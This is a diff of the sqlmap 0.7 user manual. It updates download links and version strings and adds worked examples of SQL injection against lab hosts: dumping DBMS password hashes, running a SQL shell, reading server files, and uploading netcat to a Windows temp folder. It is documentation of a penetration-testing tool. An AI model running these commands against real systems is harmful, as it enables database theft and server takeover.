@@ -51,7 +51,9 @@ sqlmap relies on the <htmlurl url="http://metasploit.com/framework/"
 name="Metasploit Framework"> for some of its post-exploitation takeover
 functionalities. You need to grab a copy of it from the
 <htmlurl url="http://metasploit.com/framework/download/" name="download">
-page. The required version is <bf>3.2</bf> or above.
+page. The required version is <bf>3.2</bf> or above, recommended is the
+latest <bf>3.3 development</bf> version from Metasploit's subversion
+repository.
 
 Optionally, if you are running sqlmap on Windows, you may wish to install
 <htmlurl url="http://ipython.scipy.org/moin/PyReadline/Intro" name="PyReadline">
@@ -349,45 +351,32 @@ stand-alone executable.
 <sect>Download and update
 
 <p>
-<bf>sqlmap 0.7 release candidate 1</bf> version can be downloaded as a
-<htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1.tar.gz"
-name="source gzip compressed"> file or as a <htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1.zip"
-name="source zip compressed"> file.
-
-<p>
 sqlmap can be downloaded from its
-<htmlurl url="http://sourceforge.net/project/showfiles.php?group_id=171598&amp;package_id=196107"
-name="SourceForge File List page">.
+<htmlurl url="http://sourceforge.net/projects/sqlmap/files/" name="SourceForge File List page">.
 It is available in various formats:
 
 <itemize>
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1.tar.gz"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7.tar.gz"
 name="Source gzip compressed"> operating system independent.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1.tar.bz2"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7.tar.bz2"
 name="Source bzip2 compressed"> operating system independent.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1.zip"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7.zip"
 name="Source zip compressed"> operating system independent.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap_0.7rc1-1_all.deb"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap_0.7-1_all.deb"
 name="DEB binary package"> architecture independent for Debian and any
 other Debian derivated GNU/Linux distribution.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1-1.noarch.rpm"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7-1.noarch.rpm"
 name="RPM binary package"> architecture independent for Fedora and any
 other operating system that can install RPM packages.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1_exe.zip"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7_exe.zip"
 name="Portable executable for Windows"> that <bf>does not require the Python
 interpreter</bf> to be installed on the operating system.
 </itemize>
-
-<p>
-Whatever way you downloaded sqlmap, run it with <tt>&#45;&#45;update</tt>
-option to update it to the latest stable version available on its
-<htmlurl url="http://sourceforge.net/project/showfiles.php?group_id=171598&amp;package_id=196107"
-name="SourceForge File List page">.
 
 <p>
 You can also checkout the source code from the sqlmap
@@ -406,7 +395,8 @@ sqlmap is released under the terms of the
 <htmlurl url="http://www.gnu.org/licenses/old-licenses/gpl-2.0.html" name="General Public License v2">.
 sqlmap is copyrighted by
 <htmlurl url="mailto:bernardo.damele@gmail.com" name="Bernardo Damele A. G.">
-and <htmlurl url="mailto:daniele.bellucci@gmail.com" name="Daniele Bellucci">.
+(2007-2009) and <htmlurl url="mailto:daniele.bellucci@gmail.com" name="Daniele Bellucci">
+(2006).
 
 
 <sect>Usage
@@ -415,7 +405,7 @@ and <htmlurl url="mailto:daniele.bellucci@gmail.com" name="Daniele Bellucci">.
 <tscreen><verb>
 $ python sqlmap.py -h
 
-    sqlmap/0.7rc1
+    sqlmap/0.7
     by Bernardo Damele A. G. <bernardo.damele@gmail.com>
     
 Usage: sqlmap.py [options]
@@ -498,16 +488,15 @@ Options:
     --dbs               Enumerate DBMS databases
     --tables            Enumerate DBMS database tables (opt -D)
     --columns           Enumerate DBMS database table columns (req -T opt -D)
-    --dump              Dump DBMS database table entries (req -T, opt -D, -C,
-                        --start, --stop)
+    --dump              Dump DBMS database table entries (req -T, opt -D, -C)
     --dump-all          Dump all DBMS databases tables entries
     -D DB               DBMS database to enumerate
     -T TBL              DBMS database table to enumerate
     -C COL              DBMS database table column to enumerate
     -U USER             DBMS user to enumerate
     --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
-    --start=LIMITSTART  First table entry to dump
-    --stop=LIMITSTOP    Last table entry to dump
+    --start=LIMITSTART  First query output entry to retrieve
+    --stop=LIMITSTOP    Last query output entry to retrieve
     --sql-query=QUERY   SQL statement to be executed
     --sql-shell         Prompt for an interactive SQL shell
 
@@ -635,7 +624,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 [hh:mm:55] [INFO] testing MySQL
@@ -648,7 +637,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </verb></tscreen>
@@ -668,7 +657,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:44] [TRAFFIC IN] HTTP response (OK - 200):
@@ -689,7 +678,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </verb></tscreen>
@@ -709,7 +698,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:17] [TRAFFIC IN] HTTP response (OK - 200):
@@ -737,7 +726,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:18] [TRAFFIC IN] HTTP response (OK - 200):
@@ -1047,7 +1036,7 @@ Host: 192.168.1.125:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Cookie: ASPSESSIONIDSABTRCAS=HPCBGONANJBGFJFHGOKDMCGJ
 Connection: close
 
@@ -1063,7 +1052,7 @@ Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
 Cookie: ASPSESSIONIDSABTRCAS=469
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:40] [WARNING] Cookie parameter 'ASPSESSIONIDSABTRCAS' is not dynamic
@@ -1114,7 +1103,7 @@ Accept-language: en-us,en;q=0.5
 Referer: http://www.google.com
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </verb></tscreen>
@@ -1130,7 +1119,7 @@ By default sqlmap perform HTTP requests providing the following HTTP
 <tt>User-Agent</tt> header value:
 
 <tscreen><verb>
-sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+sqlmap/0.7 (http://sqlmap.sourceforge.net)
 </verb></tscreen>
 
 <p>
@@ -1251,7 +1240,7 @@ Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
 Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3M=
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 
@@ -1272,7 +1261,7 @@ Authorization: Digest username="testuser", realm="Testing digest authentication"
 nonce="Qw52C8RdBAA=2d7eb362292b24718dcb6e4d9a7bf0f13d58fa9d", 
 uri="/sqlmap/mysql/digest/get_int.php?id=1", response="16d01b08ff2f77d8ff0183d706f96747", 
 algorithm="MD5", qop=auth, nc=00000001, cnonce="579be5eb8753693a"
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </verb></tscreen>
@@ -1455,7 +1444,7 @@ Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/ua_str.php" -v 1 \
-  -p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"
+  -p "user-agent" --user-agent "sqlmap/0.7 (http://sqlmap.sourceforge.net)"
 
 [hh:mm:40] [WARNING] the testable parameter 'user-agent' you provided is not into the GET
 [hh:mm:40] [INFO] testing connection to the target url
@@ -1600,7 +1589,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 [hh:mm:17] [INFO] GET parameter 'id' is custom injectable 
@@ -1672,7 +1661,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=
 [hh:mm:50] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:50] [TRAFFIC IN] HTTP response (OK - 200):
@@ -1694,7 +1683,7 @@ Content-Type: text/html
 [hh:mm:51] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:51] [TRAFFIC IN] HTTP response (OK - 200):
@@ -1716,7 +1705,7 @@ Content-Type: text/html
 [hh:mm:51] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:51] [TRAFFIC IN] HTTP response (OK - 200):
@@ -2143,7 +2132,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:29] [TRAFFIC IN] HTTP response (OK - 200):
@@ -2324,7 +2313,8 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" -v 1
 [hh:mm:38] [INFO] testing Oracle
 [hh:mm:38] [INFO] confirming Oracle
 [hh:mm:38] [INFO] the back-end DBMS is Oracle
-[hh:mm:38] [INFO] query: SELECT SUBSTR((VERSION), 1, 2) FROM SYS.PRODUCT_COMPONENT_VERSION WHERE ROWNUM=1
+[hh:mm:38] [INFO] query: SELECT SUBSTR((VERSION), 1, 2) FROM SYS.PRODUCT_COMPONENT_VERSION 
+WHERE ROWNUM=1
 [hh:mm:38] [INFO] retrieved: 10
 [hh:mm:38] [INFO] performed 20 queries in 0 seconds
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
@@ -2699,11 +2689,11 @@ Example on a <bf>MySQL 5.0.67</bf> target:
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --passwords -v 0
 
 [*] debian-sys-maint [1]:
-    password hash: *BBDC22D2B1E18F8628B2922864A621B32A1B1892
+    password hash: *BBDC22D2B1E18C8628D29228649621B32A1B1892
 [*] root [1]:
-    password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
+    password hash: *81F5E21235407A884A6CD4A731FEBFB6AF209E1B
 [*] testuser [1]:
-    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
+    password hash: *00E247BD5F9AF26AE0194B71E1E769D1E1429A29
 </verb></tscreen>
 
 <p>
@@ -2719,12 +2709,12 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --pas
 
 database management system users password hashes:
 [*] sa [1]:
-    password hash: 0x01000e16d704aa252b7c38d1aeae18756e98172f4b34104d8ee32c2f01b293b03edb7491f
+    password hash: 0x01000a16d704fa252b7c38d1aeae18756e98172f4b34104d8ce32c2f01b293b03edb7491f
 ba9930b62ee5d506955
         header: 0x0100
-        salt: 0e16d704
-        mixedcase: aa252b7c38d1aeae18756e98172f4b34104d8ee3
-        uppercase: 2c2f01b293b03edb7491fba9930b62ee5d506955
+        salt: 0a16d704
+        mixedcase: fa252b7c38d1aeae18756e98172f4b34104d8ee3
+        uppercase: 2c2f01b293b03edb7491fba9930b62ce5d506955
 </verb></tscreen>
 
 <p>
@@ -2764,7 +2754,7 @@ CHR(114)||CHR(101)||CHR(115) OFFSET 0 LIMIT 1
 [hh:mm:51] [INFO] performed 251 queries in 2 seconds
 database management system users password hashes:
 [*] postgres [1]:
-    password hash: md5d7d880f96044b72d0bba108ace96d1e4
+    password hash: md5d7d880f96034b72d0bba108afe96c1e7
 </verb></tscreen>
 
 
@@ -3229,7 +3219,7 @@ Table: users
 | 1  | luther                                       | blissett          |
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.7rc1 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.7 (http://sqlmap.sourceforge.net) | user agent header |
 | 5  | NULL                                         | nameisnull        |
 +----+----------------------------------------------+-------------------+
 </verb></tscreen>
@@ -3281,7 +3271,7 @@ Table: users
 | 1  | luther                                       | blissett          |
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.7rc1 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.7 (http://sqlmap.sourceforge.net) | user agent header |
 | 5  |                                              | nameisnull        |
 +----+----------------------------------------------+-------------------+
 
@@ -3294,7 +3284,7 @@ $ cat /software/sqlmap/output/192.168.1.121/dump/public/users.csv
 "1","luther","blissett"
 "2","fluffy","bunny"
 "3","wu","ming"
-"4","sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)","user agent header"
+"4","sqlmap/0.7 (http://sqlmap.sourceforge.net)","user agent header"
 "5","","nameisnull"
 </verb></tscreen>
 
@@ -3322,7 +3312,7 @@ Table: users
 +----+----------------------------------------------+-------------------+
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.7rc1 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.7 (http://sqlmap.sourceforge.net) | user agent header |
 +----+----------------------------------------------+-------------------+
 </verb></tscreen>
 
@@ -3354,7 +3344,7 @@ Table: users
 | 1  | luther                                       | blissett          |
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.7rc1 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.7 (http://sqlmap.sourceforge.net) | user agent header |
 | 5  | NULL                                         | nameisnull        |
 +----+----------------------------------------------+-------------------+
 
@@ -3443,7 +3433,7 @@ Table: users
 +----+----------------------------------------------+-------------------+
 | id | name                                         | surname           |
 +----+----------------------------------------------+-------------------+
-| 4  | sqlmap/0.7rc1 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.7 (http://sqlmap.sourceforge.net) | user agent header |
 | 2  | fluffy                                       | bunny             |
 | 1  | luther                                       | blisset           |
 | 3  | wu                                           | ming              |
@@ -3663,7 +3653,8 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --sql
 
 sql> [TAB TAB]
  LIMIT 
-(SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y'
+(SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) 
+LIMIT 0, 1)='Y'
 AND ORD(MID((%s), %d, 1)) > %d
 CAST(%s AS CHAR(10000))
 COUNT(%s)
@@ -3676,7 +3667,8 @@ MID((%s), %d, %d)
 ORDER BY %s ASC
 SELECT %s FROM %s.%s
 SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)
-SELECT column_name, column_type FROM information_schema.COLUMNS WHERE table_name='%s' AND table_schema='%s'
+SELECT column_name, column_type FROM information_schema.COLUMNS WHERE table_name='%s' AND 
+table_schema='%s'
 SELECT grantee FROM information_schema.USER_PRIVILEGES
 SELECT grantee, privilege_type FROM information_schema.USER_PRIVILEGES
 SELECT schema_name FROM information_schema.SCHEMATA
@@ -3731,10 +3723,12 @@ table_schema=CHAR(116,101,115,116) LIMIT 2, 1
 [hh:mm:48] [INFO] performed 55 queries in 0 seconds
 [hh:mm:48] [INFO] the query with column names is: SELECT id, name, surname FROM test.users
 [hh:mm:48] [INPUT] can the SQL query provided return multiple entries? [Y/n] y
-[hh:mm:04] [INFO] query: SELECT IFNULL(CAST(COUNT(id) AS CHAR(10000)), CHAR(32)) FROM test.users
+[hh:mm:04] [INFO] query: SELECT IFNULL(CAST(COUNT(id) AS CHAR(10000)), CHAR(32)) FROM 
+test.users
 [hh:mm:04] [INFO] retrieved: 5
 [hh:mm:04] [INFO] performed 13 queries in 0 seconds
-[hh:mm:04] [INPUT] the SQL query that you provide can return up to 5 entries. How many entries 
+[hh:mm:04] [INPUT] the SQL query that you provide can return up to 5 entries. How many 
+entries 
 do you want to retrieve?
 [a] All (default)
 [#] Specific number
@@ -3749,8 +3743,8 @@ ORDER BY id ASC LIMIT 0, 1
 ORDER BY id ASC LIMIT 0, 1
 [hh:mm:09] [INFO] retrieved: luther
 [hh:mm:09] [INFO] performed 48 queries in 0 seconds
-[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(surname AS CHAR(10000)), CHAR(32)) FROM test.users 
-ORDER BY id ASC LIMIT 0, 1
+[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(surname AS CHAR(10000)), CHAR(32)) FROM 
+test.users ORDER BY id ASC LIMIT 0, 1
 [hh:mm:09] [INFO] retrieved: blissett
 [hh:mm:09] [INFO] performed 62 queries in 0 seconds
 [hh:mm:09] [INFO] query: SELECT IFNULL(CAST(id AS CHAR(10000)), CHAR(32)) FROM test.users 
@@ -3761,8 +3755,8 @@ ORDER BY id ASC LIMIT 1, 1
 ORDER BY id ASC LIMIT 1, 1
 [hh:mm:09] [INFO] retrieved: fluffy
 [hh:mm:09] [INFO] performed 48 queries in 0 seconds
-[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(surname AS CHAR(10000)), CHAR(32)) FROM test.users 
-ORDER BY id ASC LIMIT 1, 1
+[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(surname AS CHAR(10000)), CHAR(32)) FROM 
+test.users ORDER BY id ASC LIMIT 1, 1
 [hh:mm:09] [INFO] retrieved: bunny
 [hh:mm:09] [INFO] performed 41 queries in 0 seconds
 [hh:mm:09] [INFO] query: SELECT IFNULL(CAST(id AS CHAR(10000)), CHAR(32)) FROM test.users 
@@ -3773,8 +3767,8 @@ ORDER BY id ASC LIMIT 2, 1
 ORDER BY id ASC LIMIT 2, 1
 [hh:mm:09] [INFO] retrieved: wu
 [hh:mm:09] [INFO] performed 20 queries in 0 seconds
-[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(surname AS CHAR(10000)), CHAR(32)) FROM test.users 
-ORDER BY id ASC LIMIT 2, 1
+[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(surname AS CHAR(10000)), CHAR(32)) FROM 
+test.users ORDER BY id ASC LIMIT 2, 1
 [hh:mm:09] [INFO] retrieved: ming
 [hh:mm:10] [INFO] performed 34 queries in 0 seconds
 SELECT * FROM test.users [3]:
@@ -3799,7 +3793,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --sql
 [...]
 back-end DBMS: PostgreSQL
 
-[10:11:42] [INFO] calling PostgreSQL shell. To quit type 'x' or 'q' and press ENTER
+[10:hh:mm] [INFO] calling PostgreSQL shell. To quit type 'x' or 'q' and press ENTER
 sql> SELECT COUNT(name) FROM users
 [10:11:57] [INFO] fetching SQL SELECT statement query output: 'SELECT COUNT(name) FROM users'
 [10:11:57] [INPUT] can the SQL query provided return multiple entries? [Y/n] n
@@ -3812,8 +3806,8 @@ SELECT COUNT(name) FROM users:    '4'
 sql> INSERT INTO users (id, name, surname) VALUES (5, 'from', 'sql shell');
 [10:12:35] [INFO] testing stacked queries support on parameter 'id'
 [10:12:40] [INFO] the web application supports stacked queries on parameter 'id'
-[10:12:40] [INFO] executing SQL data manipulation query: 'INSERT INTO users (id, name, surname) 
-VALUES (5, 'from', 'sql shell');'
+[10:12:40] [INFO] executing SQL data manipulation query: 'INSERT INTO users 
+(id, name, surname) VALUES (5, 'from', 'sql shell');'
 [10:12:40] [INFO] done
 sql> SELECT COUNT(name) FROM users
 [10:12:51] [INFO] fetching SQL SELECT statement query output: 'SELECT COUNT(name) FROM users'
@@ -3847,21 +3841,23 @@ Option: <tt>--read-file</tt>
 
 <p>
 It is possible to retrieve the content of files from the underlying file
-system when the back-end database management is system is either MySQL,
-PostgreSQL or Microsoft SQL Server.
+system when the back-end database management system is either MySQL,
+PostgreSQL or Microsoft SQL Server and the session user has the needed
+privileges to abuse database specific functionalities and architectural
+weaknesses.
 The file specified can be either a text or a binary file, sqlmap will
 handle either cases automatically.
 
 <p>
-The techniques implemented are detailed on the white paper
+These techniques are detailed on the white paper
 <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
 
 <p>
-Example on a <bf>PostgreSQL 8.3.5</bf> target:
+Example on a <bf>PostgreSQL 8.3.5</bf> target to retrieve a text file:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --read-file \
-  "C:\example.txt" -v2
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.aspx?id=1" \
+  --read-file "C:\example.txt" -v 2
 
 [...]
 [hh:mm:53] [INFO] the back-end DBMS is PostgreSQL
@@ -3917,6 +3913,49 @@ $ cat output/192.168.1.121/files/C__example.txt
 This is a text file
 </verb></tscreen>
 
+<p>
+Example on a <bf>Microsoft SQL Server 2005 Service Pack 0</bf> target to
+retrieve a binary file:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/iis/get_str2.asp?name=luther" \
+  --read-file "C:\example.exe" --union-use -v 1
+
+[...]
+[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 2000
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP
+back-end DBMS: Microsoft SQL Server 2005
+
+[hh:mm:49] [INFO] testing inband sql injection on parameter 'name' with NULL bruteforcing 
+technique
+[hh:mm:49] [INFO] confirming full inband sql injection on parameter 'name'
+[hh:mm:49] [WARNING] the target url is not affected by an exploitable full inband sql 
+injection vulnerability
+[hh:mm:49] [INFO] confirming partial (single entry) inband sql injection on parameter 
+'name' by appending a false condition after the parameter value
+[hh:mm:49] [INFO] the target url is affected by an exploitable partial (single entry) 
+inband sql injection vulnerability
+valid union:    'http://192.168.1.121:80/sqlmap/mssql/iis/get_str2.asp?name=luther' UNION 
+ALL SELECT NULL, NULL, NULL-- AND 'sjOfJ'='sjOfJ'
+
+[hh:mm:49] [INFO] testing stacked queries support on parameter 'name'
+[hh:mm:54] [INFO] the web application supports stacked queries on parameter 'name'
+[hh:mm:54] [INFO] fetching file: 'C:/example.exe'
+[hh:mm:54] [INFO] the SQL query provided returns 3 entries
+C:/example.exe file saved to:    '/home/inquis/sqlmap/output/192.168.1.121/files/
+C__example.exe'
+
+[hh:mm:54] [INFO] Fetched data logged to text files under '/home/inquis/sqlmap/output/
+192.168.1.121'
+
+$ ls -l output/192.168.1.121/files/C__example.exe 
+-rw-r--r-- 1 inquis inquis 2560 2009-MM-DD hh:mm output/192.168.1.121/files/C__example.exe
+
+$ file output/192.168.1.121/files/C__example.exe 
+output/192.168.1.121/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit
+</verb></tscreen>
+
 
 <sect2>Write a local file on the back-end DBMS file system
 
@@ -3925,69 +3964,385 @@ Options: <tt>--write-file</tt> and <tt>--dest-file</tt>
 
 <p>
 It is possible to upload a local file to the underlying file system when
-the back-end database management is system is either MySQL, PostgreSQL or
-Microsoft SQL Server.
+the back-end database management system is either MySQL, PostgreSQL or
+Microsoft SQL Server and the session user has the needed privileges to
+abuse database specific functionalities and architectural weaknesses.
 The file specified can be either a text or a binary file, sqlmap will
 handle either cases automatically.
 
 <p>
-The techniques implemented are detailed on the white paper
+These techniques are detailed on the white paper
 <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
 
 <p>
-Example on a <bf>MySQL 5.0.67</bf> target:
+Example on a <bf>MySQL 5.0.67</bf> target to upload a binary UPX-compressed
+file:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --write-file \
-  "/home/inquis/software/netcat/nc.exe.packed" --dest-file "C:\WINDOWS\Temp\nc.exe" -v 1
+$ file /tmp/nc.exe.packed 
+/tmp/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit
+
+$ ls -l /tmp/nc.exe.packed
+-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /tmp/nc.exe.packed
+
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.aspx?id=1" --write-file \
+  "/tmp/nc.exe.packed" --dest-file "C:\WINDOWS\Temp\nc.exe" -v 1
 
 [...]
-[01:12:29] [INFO] the back-end DBMS is MySQL
+[hh:mm:29] [INFO] the back-end DBMS is MySQL
 web server operating system: Windows 2003 or 2008
 web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
 back-end DBMS: MySQL >= 5.0.0
 
-[01:12:29] [INFO] testing stacked queries support on parameter 'id'
-[01:12:29] [INFO] detecting back-end DBMS version from its banner
-[01:12:29] [INFO] retrieved: 5.0.67
-[01:12:36] [INFO] the web application supports stacked queries on parameter 'id'
-[01:12:36] [INFO] fingerprinting the back-end DBMS operating system
-[01:12:36] [INFO] retrieved: C
-[01:12:36] [INFO] the back-end DBMS operating system is Windows
+[hh:mm:29] [INFO] testing stacked queries support on parameter 'id'
+[hh:mm:29] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:29] [INFO] retrieved: 5.0.67
+[hh:mm:36] [INFO] the web application supports stacked queries on parameter 'id'
+[hh:mm:36] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:36] [INFO] retrieved: C
+[hh:mm:36] [INFO] the back-end DBMS operating system is Windows
 do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been successfully 
 written on the back-end DBMS file system? [Y/n] y
-[01:12:52] [INFO] retrieved: 31744
-[01:12:52] [INFO] the file has been successfully written and its size is 31744 bytes, same 
-size as the local file '/home/inquis/software/netcat/nc.exe.packed'
